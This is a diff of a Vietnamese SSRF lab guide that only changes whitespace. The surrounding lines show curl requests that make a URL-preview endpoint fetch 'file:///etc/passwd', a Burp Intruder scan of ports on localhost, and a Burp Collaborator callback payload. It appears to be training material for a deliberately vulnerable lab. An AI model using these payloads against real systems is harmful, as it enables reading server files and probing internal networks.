@@ -72,7 +72,7 @@ curl -X POST http://localhost:8081/api/posts/preview-url \
 ```bash
 curl -X POST http://localhost:8081/api/posts/preview-url \
   -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
+  -H "Authorization: Bearer YOUR_JWT_TOKEN" \ 
   -d '{"url": "file:///etc/passwd"}'
 
 curl -X POST http://localhost:8081/api/posts/preview-url \
@@ -146,13 +146,13 @@ done
    ```
 
 3. **Sử dụng Burp Intruder** để scan ports:
-   - Position: `http://127.0.0.1:§22§`
-   - Payload: Numbers 1-65535
-   - Grep Match: tìm response khác nhau để identify open ports
+    - Position: `http://127.0.0.1:§22§`
+    - Payload: Numbers 1-65535
+    - Grep Match: tìm response khác nhau để identify open ports
 
 4. **Sử dụng Burp Collaborator** để verify SSRF:
-   - `{"url": "http://BURP_COLLABORATOR_PAYLOAD"}`
-   - Check DNS/HTTP interactions
+    - `{"url": "http://BURP_COLLABORATOR_PAYLOAD"}`
+    - Check DNS/HTTP interactions
 
 ## Cách phòng chống (KHÔNG áp dụng cho lab)
 
